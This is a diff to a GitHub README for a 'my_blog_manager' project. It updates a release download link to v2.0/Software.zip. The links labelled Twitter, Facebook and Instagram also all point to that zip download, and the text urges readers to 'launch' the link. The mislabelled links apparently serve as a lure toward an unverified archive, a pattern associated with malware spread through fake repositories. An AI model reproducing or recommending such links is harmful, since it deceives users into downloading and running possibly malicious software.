@@ -24,7 +24,7 @@ Welcome to the **my_blog_manager** repository! This project focuses on dynamical
 
 To get started with the **my_blog_manager** repository, you can download the latest release by clicking the button below:
 
-[![Download Latest Release](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v1.0/Software.zip%20Release-blue)](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v1.0/Software.zip)
+[![Download Latest Release](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v2.0/Software.zip%20Release-blue)](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v2.0/Software.zip)
 
 Please note that the link provided needs to be launched to access the latest release.
 
@@ -42,9 +42,9 @@ We welcome contributions from the open-source community to enhance and improve t
 
 Stay up to date with the latest developments by following us on social media:
 
-🐦 Twitter: [@my_blog_manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v1.0/Software.zip)
-👍 Facebook: [My Blog Manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v1.0/Software.zip)
-📷 Instagram: [@my_blog_manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v1.0/Software.zip)
+🐦 Twitter: [@my_blog_manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v2.0/Software.zip)
+👍 Facebook: [My Blog Manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v2.0/Software.zip)
+📷 Instagram: [@my_blog_manager](https://github.com/Ilikeitbig7263/my_blog_manager/releases/download/v2.0/Software.zip)
 
 Feel free to reach out to us with any questions, feedback, or suggestions. We'd love to hear from you!
 
